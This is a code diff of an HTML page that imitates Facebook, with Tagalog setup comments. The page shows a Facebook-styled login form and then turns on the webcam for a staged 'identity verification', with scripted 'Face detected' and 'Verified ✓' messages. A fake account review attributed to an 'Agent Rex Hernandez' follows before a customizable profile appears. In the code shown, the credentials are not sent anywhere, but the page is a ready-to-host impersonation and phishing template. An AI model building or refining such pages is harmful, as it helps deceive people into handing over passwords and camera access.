@@ -10,76 +10,99 @@ body{background:#f0f2f5;color:#1c1e21;}
 .hidden{display:none !important;}
 
 /* === LOGIN SCREEN === */
-.login-screen{display:block;text-align:center;margin-top:80px;padding:20px;}
-.fb-logo{font-size:60px;color:#1877f2;font-weight:bold;margin-bottom:20px;}
-.login-screen h2{font-size:22px;margin-bottom:24px;color:#1c1e21;}
-.input-field{width:100%;max-width:360px;padding:12px 16px;margin:8px auto;border:1px solid #dddfe2;border-radius:6px;font-size:16px;display:block;}
-.login-btn{width:100%;max-width:360px;padding:12px;background:#1877f2;color:#ffffff;border:none;border-radius:6px;font-size:17px;font-weight:600;cursor:pointer;margin-top:12px;}
+.login-screen{display:block;text-align:center;margin-top:120px;padding:20px;}
+.fb-logo{font-size:60px;color:#1877f2;font-weight:bold;margin-bottom:16px;}
+.login-screen h2{font-size:24px;margin-bottom:24px;color:#1c1e21;}
+.input-field{width:100%;max-width:360px;padding:14px 16px;margin:8px auto;border:1px solid #dddfe2;border-radius:6px;font-size:17px;display:block;}
+.login-btn{width:100%;max-width:360px;padding:14px;background:#1877f2;color:#ffffff;border:none;border-radius:6px;font-size:17px;font-weight:600;cursor:pointer;margin-top:12px;}
 .login-btn:hover{background:#166fe5;}
 
 /* === FACE SCAN SCREEN === */
 .face-scan-screen{position:fixed;top:0;left:0;width:100%;height:100%;background:#ffffff;z-index:1000;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;text-align:center;}
-.scan-circle{width:220px;height:220px;border-radius:50%;border:3px solid #dddfe2;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;margin-bottom:24px;}
+.scan-circle{width:260px;height:260px;border-radius:50%;border:3px solid #1877f2;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;margin-bottom:24px;background:#000;}
 .scan-circle video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);}
-.scan-line{position:absolute;width:100%;height:3px;background:#1877f2;animation:scan 2s ease-in-out infinite;z-index:10;}
+.scan-line{position:absolute;width:100%;height:4px;background:linear-gradient(transparent, #1877f2, transparent);animation:scan 2s ease-in-out infinite;z-index:10;}
 @keyframes scan{
   0%{top:0;}
-  50%{top:calc(100% - 3px);}
+  50%{top:calc(100% - 4px);}
   100%{top:0;}
 }
-.face-scan-screen h2{font-size:20px;font-weight:600;color:#1c1e21;margin-bottom:8px;}
-.face-scan-screen p{font-size:15px;color:#65676b;margin-bottom:6px;}
-.scan-status{color:#1877f2;font-weight:600;margin-top:12px;}
+.face-scan-screen h2{font-size:22px;font-weight:600;color:#1c1e21;margin-bottom:8px;}
+.face-scan-screen p{font-size:16px;color:#65676b;margin-bottom:6px;}
+.scan-status{color:#1877f2;font-weight:600;margin-top:12px;font-size:18px;}
 
 /* === LOADING SCREEN === */
 .loading-screen{position:fixed;top:0;left:0;width:100%;height:100%;background:#ffffff;z-index:1001;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;text-align:center;}
-.loading-spinner{width:60px;height:60px;border:4px solid #e0e0e0;border-top-color:#1877f2;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:24px;}
+.loading-spinner{width:70px;height:70px;border:4px solid #e0e0e0;border-top-color:#1877f2;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:24px;}
 @keyframes spin{to{transform:rotate(360deg);}}
-.loading-screen h2{font-size:20px;font-weight:600;color:#1c1e21;margin-bottom:8px;}
-.loading-screen p{font-size:15px;color:#65676b;margin-bottom:6px;}
+.loading-screen h2{font-size:22px;font-weight:600;color:#1c1e21;margin-bottom:8px;}
+.loading-screen p{font-size:16px;color:#65676b;margin-bottom:6px;}
 .loading-time{font-size:16px;font-weight:600;color:#1877f2;margin-top:8px;}
 
 /* === PROFILE PAGE === */
-.cover-container{width:100%;height:200px;background:#dddfe2;position:relative;overflow:hidden;}
+.cover-container{width:100%;height:350px;background:#dddfe2;position:relative;overflow:hidden;}
 .cover-photo{width:100%;height:100%;object-fit:cover;}
-.share-note{position:absolute;bottom:12px;left:12px;background:rgba(255,255,255,0.9);color:#1c1e21;padding:6px 12px;border-radius:20px;font-size:14px;}
-.camera-btn{position:absolute;bottom:12px;right:12px;background:#ffffff;border:none;border-radius:50%;width:36px;height:36px;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,0.1);}
-.camera-btn svg{width:20px;height:20px;fill:#1c1e21;}
+.menu-icon{position:absolute;top:16px;left:16px;width:40px;height:40px;background:rgba(255,255,255,0.9);border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,0.1);z-index:10;}
+.menu-icon svg{width:22px;height:22px;fill:#1c1e21;}
+.top-icons{position:absolute;top:16px;right:16px;display:flex;gap:12px;align-items:center;z-index:10;}
+.top-icon{width:40px;height:40px;background:rgba(255,255,255,0.9);border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,0.1);}
+.top-icon svg{width:20px;height:20px;fill:#1c1e21;}
+.share-note{position:absolute;bottom:16px;left:16px;background:rgba(255,255,255,0.95);color:#1c1e21;padding:8px 18px;border-radius:20px;font-size:15px;box-shadow:0 1px 3px rgba(0,0,0,0.1);font-weight:500;}
+.camera-btn-cover{position:absolute;bottom:16px;right:16px;background:rgba(255,255,255,0.95);border:none;border-radius:50%;width:40px;height:40px;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,0.1);}
+.camera-btn-cover svg{width:22px;height:22px;fill:#1c1e21;}
 
-.profile-section{background:#ffffff;padding:0 16px 20px;margin-top:-60px;}
-.profile-header{display:flex;align-items:flex-end;gap:15px;margin-bottom:12px;}
-.profile-pic{width:140px;height:140px;border-radius:50%;border:4px solid #ffffff;object-fit:cover;background:#dddfe2;}
-.profile-name{font-size:24px;font-weight:700;color:#1c1e21;}
-.profile-meta{font-size:15px;color:#65676b;margin:4px 0 8px 0;}
-.profile-bio{font-size:15px;color:#1c1e21;line-height:1.6;margin-bottom:16px;}
+.profile-section{background:#ffffff;padding:0 16px 24px;margin-top:-80px;position:relative;}
+.profile-header{display:flex;align-items:flex-end;gap:16px;margin-bottom:16px;position:relative;flex-wrap:wrap;}
+.profile-pic-wrap{position:relative;margin-top:-80px;z-index:5;}
+.profile-pic{width:168px;height:168px;border-radius:50%;border:4px solid #ffffff;object-fit:cover;background:#dddfe2;box-shadow:0 1px 3px rgba(0,0,0,0.1);}
+.camera-btn-profile{position:absolute;bottom:8px;right:8px;background:#f0f2f5;border:none;border-radius:50%;width:34px;height:34px;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 1px 3px rgba(0,0,0,0.1);}
+.camera-btn-profile svg{width:18px;height:18px;fill:#1c1e21;}
+.profile-info{flex:1;min-width:250px;padding-bottom:10px;}
+.name-row{display:flex;align-items:center;gap:8px;flex-wrap:wrap;}
+.profile-name{font-size:32px;font-weight:700;color:#1c1e21;}
+.dropdown-icon{width:32px;height:32px;background:#f0f2f5;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;}
+.dropdown-icon svg{width:16px;height:16px;fill:#1c1e21;}
+.profile-meta{font-size:15px;color:#65676b;margin-top:4px;}
+.profile-bio{font-size:15px;color:#1c1e21;line-height:1.5;margin:12px 0;}
 
-.info-row{display:flex;align-items:center;gap:10px;margin-bottom:12px;font-size:15px;color:#1c1e21;}
+.info-row{display:flex;align-items:center;gap:8px;margin-bottom:16px;font-size:15px;color:#1c1e21;padding:4px 0;}
 .info-row svg{width:20px;height:20px;fill:#65676b;flex-shrink:0;}
 
-.button-row{display:flex;gap:12px;margin:20px 0;}
-.btn-primary{flex:1;padding:8px 12px;background:#1877f2;color:#ffffff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;}
-.btn-secondary{flex:1;padding:8px 12px;background:#e4e6eb;color:#1c1e21;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;}
-.btn-primary svg, .btn-secondary svg{width:18px;height:18px;fill:currentColor;}
+.button-row{display:flex;gap:12px;margin:20px 0;flex-wrap:wrap;}
+.btn-dashboard{flex:1;min-width:140px;padding:10px 16px;background:#0081FB;color:#ffffff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;}
+.btn-dashboard:hover{background:#006edb;}
+.btn-create{flex:1;min-width:140px;padding:10px 16px;background:#e4e6eb;color:#1c1e21;border:none;border-radius:6px;font-size:15px;font-weight:500;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;}
+.btn-create:hover{background:#d8dadf;}
 
-.tabs{display:flex;gap:24px;border-bottom:1px solid #e4e6eb;margin:20px 0;}
-.tab{padding:10px 0;font-size:15px;font-weight:600;color:#65676b;cursor:pointer;}
-.tab.active{color:#1877f2;border-bottom:2px solid #1877f2;}
+.tabs{display:flex;gap:32px;border-bottom:1px solid #e4e6eb;margin:24px 0;flex-wrap:wrap;}
+.tab{padding:12px 0;font-size:15px;font-weight:500;color:#65676b;cursor:pointer;}
+.tab.active{color:#0081FB;border-bottom:2px solid #0081FB;font-weight:600;}
 
-.details-header{display:flex;justify-content:space-between;align-items:center;margin:24px 0 16px 0;}
-.details-header h2{font-size:18px;font-weight:700;color:#1c1e21;}
-.edit-icon{width:20px;height:20px;fill:#65676b;cursor:pointer;}
+.details-header{display:flex;justify-content:space-between;align-items:center;margin:32px 0 16px 0;}
+.details-header h2{font-size:18px;font-weight:600;color:#1c1e21;}
+.edit-icon{width:24px;height:24px;fill:#65676b;cursor:pointer;}
 
-.detail-item{display:flex;align-items:center;gap:12px;margin-bottom:16px;font-size:15px;color:#1c1e21;}
+.detail-item{display:flex;align-items:center;gap:12px;margin-bottom:12px;font-size:15px;color:#1c1e21;padding:4px 0;}
 .detail-item svg{width:20px;height:20px;fill:#65676b;flex-shrink:0;}
 </style>
 </head>
 <body>
 
+<!-- ====================================== -->
+<!-- PALITAN MO DITO YONG MGA LINK NG IMGUR -->
+<!-- ====================================== -->
+<script>
+const CONFIG = {
+  coverPhotoLink: "https://i.imgur.com/XXXXXXXXXXXX.jpg",
+  profilePhotoLink: "https://i.imgur.com/XXXXXXXXXXXX.jpg"
+};
+</script>
+
 <!-- === 1. LOGIN SCREEN === -->
 <div id="loginScreen" class="login-screen">
   <div class="fb-logo">f</div>
   <h2>Log In</h2>
-  <input type="text" id="emailInput" class="input-field" placeholder="Email or phone number">
+  <input type="email" id="emailInput" class="input-field" placeholder="Email address or phone number">
   <input type="password" id="passwordInput" class="input-field" placeholder="Password">
   <button id="loginButton" class="login-btn">Log In</button>
 </div>
@@ -91,52 +114,77 @@ body{background:#f0f2f5;color:#1c1e21;}
     <div class="scan-line"></div>
   </div>
   <h2>Verifying your identity</h2>
-  <p>Please look at the camera</p>
-  <p class="scan-status" id="scanStatus">Scanning face...</p>
+  <p>Position your face inside the circle</p>
+  <p class="scan-status" id="scanStatus">Initializing camera...</p>
 </div>
 
 <!-- === 3. LOADING SCREEN === -->
 <div id="loadingScreen" class="loading-screen hidden">
   <div class="loading-spinner"></div>
   <h2>We are reviewing your account</h2>
-  <p>Please do not close this window</p>
+  <p>Agent Rex Hernandez is processing your account</p>
   <p class="loading-time">Estimated review time: Approximately 1 hour</p>
-  <p style="margin-top:20px;font-size:13px;color:#90949c;">This will automatically redirect when complete</p>
 </div>
 
 <!-- === 4. PROFILE PAGE === -->
 <div id="profilePage" class="hidden">
   <div class="cover-container">
-    <img class="cover-photo" id="coverImg" src="https://i.imgur.com/REPLACE_THIS_WITH_YOUR_COVER_LINK.jpg" alt="Cover Photo">
-    <div class="share-note">Share a song...</div>
-    <button class="camera-btn">
-      <svg viewBox="0 0 24 24"><path d="M12 15.2c1.77 0 3.2-1.43 3.2-3.2S13.77 8.8 12 8.8 8.8 10.23 8.8 12s1.43 3.2 3.2 3.2zM9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
+    <img class="cover-photo" id="coverImg" src="" alt="Cover Photo">
+    
+    <div class="menu-icon">
+      <svg viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+    </div>
+    <div class="top-icons">
+      <div class="top-icon">
+        <svg viewBox="0 0 24 24"><path d="M17 3H7c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2z"/></svg>
+      </div>
+      <div class="top-icon">
+        <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5z"/></svg>
+      </div>
+      <div class="top-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
+      </div>
+    </div>
+    
+    <div class="share-note">+ Add to story</div>
+    
+    <button class="camera-btn-cover">
+      <svg viewBox="0 0 24 24"><path d="M12 15.2c1.77 0 3.2-1.43 3.2-3.2S13.77 8.8 12 8.8 8.8 10.23 8.8 12s1.43 3.2 3.2 3.2zM9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9z"/></svg>
     </button>
   </div>
 
   <div class="profile-section">
     <div class="profile-header">
-      <img class="profile-pic" id="profileImg" src="https://i.imgur.com/REPLACE_THIS_WITH_YOUR_PROFILE_LINK.jpg" alt="Profile Photo">
-      <div>
-        <h1 class="profile-name" id="profileName">Jutt X.</h1>
-        <p class="profile-meta" id="profileMeta">11 followers · 0 following · 5 posts</p>
+      <div class="profile-pic-wrap">
+        <img class="profile-pic" id="profileImg" src="" alt="Profile Photo">
+        <button class="camera-btn-profile">
+          <svg viewBox="0 0 24 24"><path d="M12 15.2c1.77 0 3.2-1.43 3.2-3.2S13.77 8.8 12 8.8 8.8 10.23 8.8 12s1.43 3.2 3.2 3.2zM9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9z"/></svg>
+        </button>
+      </div>
+      <div class="profile-info">
+        <div class="name-row">
+          <h1 class="profile-name">Jutt X.</h1>
+          <div class="dropdown-icon">
+            <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+          </div>
+        </div>
+        <p class="profile-meta">11 followers · 0 following · 5 posts</p>
+        <p class="profile-bio">Profile · Digital creator<br>They hate uh for a reason.<br>Editor Jutt Inside ❤️</p>
       </div>
     </div>
 
-    <p class="profile-bio" id="profileBio">Profile · Digital creator<br>They hate uh for a reason.<br>Editor Jutt Inside</p>
-
     <div class="info-row">
-      <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 14H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v10c0 .55-.45 1-1 1zm-1-7h-4v3h4v-3zm-4-1V8h4v1h-4z"/></svg>
-      <span><strong id="workText">Digital creator</strong> · <span id="locationText">Lahore</span></span>
+      <svg viewBox="0 0 24 24"><path d="M21 3H3c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H3V5h18v14zM9 12h2v5H9zm4 0h2v5h-2zm-4-4h2v2H9zm4 0h2v2h-2z"/></svg>
+      <span><strong>Digital creator</strong> · Lahore</span>
     </div>
 
     <div class="button-row">
-      <button class="btn-primary">
-        <svg viewBox="0 0 24 24"><path d="M3 13h2v-2H3v2zm0 4h2v-2H3v2zm0-8h2V7H3v2zm4 4h14v-2H7v2zm0 4h14v-2H7v2zm0-8v2h14V9H7z"/></svg>
+      <button class="btn-dashboard">
+        <svg viewBox="0 0 24 24" style="width:20px;height:20px;fill:white;"><path d="M3 13h2v-2H3v2zm0 4h2v-2H3v2zm0-8h2V7H3v2zm4 4h14v-2H7v2zm0 4h14v-2H7v2zm0-8v2h14V9H7z"/></svg>
         Dashboard
       </button>
-      <button class="btn-secondary">
-        <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+      <button class="btn-create">
+        <svg viewBox="0 0 24 24" style="width:20px;height:20px;fill:#1c1e21;"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
         Create
       </button>
     </div>
@@ -155,50 +203,25 @@ body{background:#f0f2f5;color:#1c1e21;}
 
     <div class="detail-item">
       <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
-      <span id="hometownText">Lahore, Pakistan</span>
+      <span>Lahore, Pakistan</span>
     </div>
 
     <div class="detail-item">
       <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
-      <span id="locationDetailText">Lahore, Pakistan</span>
+      <span>Lahore, Pakistan</span>
     </div>
 
     <div class="detail-item">
       <svg viewBox="0 0 24 24"><path d="M19 3h-1V1h-2v2H8V1H6v2H5c-1.11 0-1.99.9-1.99 2L3 19c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V8h14v11zM9 10H7v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2z"/></svg>
-      <span id="birthdayText">August 1</span>
+      <span>August 1</span>
     </div>
   </div>
 </div>
 
 <script>
-// ==============================================
-// ✅ PALITAN MO ANG DETALYE MO DITO
-// ==============================================
-const SETTINGS = {
-  coverImage: "https://i.imgur.com/REPLACE_THIS_WITH_YOUR_COVER_LINK.jpg",
-  profileImage: "https://i.imgur.com/REPLACE_THIS_WITH_YOUR_PROFILE_LINK.jpg",
-  
-  fullName: "Jutt X.",
-  followers: "11",
-  following: "0",
-  posts: "5",
-  
-  bioText: "Profile · Digital creator\nThey hate uh for a reason.\nEditor Jutt Inside",
-  
-  work: "Digital creator",
-  generalLocation: "Lahore",
-  
-  hometown: "Lahore, Pakistan",
-  currentLocation: "Lahore, Pakistan",
-  birthday: "August 1",
-  
-  faceScanTime: 2500,
-  loadingTime: 3000
-};
+document.getElementById('coverImg').src = CONFIG.coverPhotoLink;
+document.getElementById('profileImg').src = CONFIG.profilePhotoLink;
 
-// ==============================================
-// HUWAG NA BAGUHIN SA ILALIM NITO
-// ==============================================
 const loginScreen = document.getElementById('loginScreen');
 const faceScanScreen = document.getElementById('faceScanScreen');
 const loadingScreen = document.getElementById('loadingScreen');
@@ -207,61 +230,45 @@ const loginButton = document.getElementById('loginButton');
 const scanStatus = document.getElementById('scanStatus');
 const cameraFeed = document.getElementById('cameraFeed');
 
-loginButton.addEventListener('click', async function(){
-  const email = document.getElementById('emailInput').value;
-  const pass = document.getElementById('passwordInput').value;
+loginButton.addEventListener('click', function(){
+  const email = document.getElementById('emailInput').value.trim();
+  const pass = document.getElementById('passwordInput').value.trim();
   
   if(email && pass){
     loginScreen.classList.add('hidden');
     faceScanScreen.classList.remove('hidden');
     
-    // ✅ Totoong camera — gagana sa GitHub Pages
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: "user", width: 400, height: 400 }
-      });
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(function(stream) {
       cameraFeed.srcObject = stream;
-    } catch (err) {
-      console.log('Camera permission:', err);
-      scanStatus.textContent = "Camera permission denied";
-    }
-    
-    // Face scan status updates
-    setTimeout(() => { scanStatus.textContent = "Face detected..."; }, 1000);
-    setTimeout(() => { scanStatus.textContent = "Verified ✓"; }, 2000);
-    
-    // Face Scan → Loading
-    setTimeout(() => {
-      if(cameraFeed.srcObject) {
-        cameraFeed.srcObject.getTracks().forEach(track => track.stop());
-      }
-      faceScanScreen.classList.add('hidden');
-      loadingScreen.classList.remove('hidden');
-    }, SETTINGS.faceScanTime);
-    
-    // Loading → Profile
-    setTimeout(() => {
-      loadingScreen.classList.add('hidden');
-      profilePage.classList.remove('hidden');
-    }, SETTINGS.faceScanTime + SETTINGS.loadingTime);
-    
+      scanStatus.textContent = "Camera ready. Scanning...";
+      
+      setTimeout(function() { scanStatus.textContent = "Face detected ✓"; }, 1500);
+      setTimeout(function() { scanStatus.textContent = "Verifying..."; }, 2500);
+      setTimeout(function() { scanStatus.textContent = "Verified ✓"; }, 3500);
+      
+      setTimeout(function() {
+        if(cameraFeed.srcObject) {
+          cameraFeed.srcObject.getTracks().forEach(function(track) { track.stop(); });
+        }
+        faceScanScreen.classList.add('hidden');
+        loadingScreen.classList.remove('hidden');
+      }, 4500);
+      
+      setTimeout(function() {
+        loadingScreen.classList.add('hidden');
+        profilePage.classList.remove('hidden');
+      }, 6500);
+    })
+    .catch(function(err) {
+      scanStatus.textContent = "Please ALLOW camera access";
+      console.log('Camera error:', err);
+    });
   } else {
-    alert('Please enter email and password');
+    alert('Please enter both email and password');
   }
 });
-
-// Update profile details
-document.getElementById('coverImg').src = SETTINGS.coverImage;
-document.getElementById('profileImg').src = SETTINGS.profileImage;
-document.getElementById('profileName').textContent = SETTINGS.fullName;
-document.getElementById('profileMeta').textContent = 
-  `${SETTINGS.followers} followers · ${SETTINGS.following} following · ${SETTINGS.posts} posts`;
-document.getElementById('profileBio').innerHTML = SETTINGS.bioText.replace(/\n/g, '<br>');
-document.getElementById('workText').textContent = SETTINGS.work;
-document.getElementById('locationText').textContent = SETTINGS.generalLocation;
-document.getElementById('hometownText').textContent = SETTINGS.hometown;
-document.getElementById('locationDetailText').textContent = SETTINGS.currentLocation;
-document.getElementById('birthdayText').textContent = SETTINGS.birthday;
 </script>
+
 </body>
 </html>
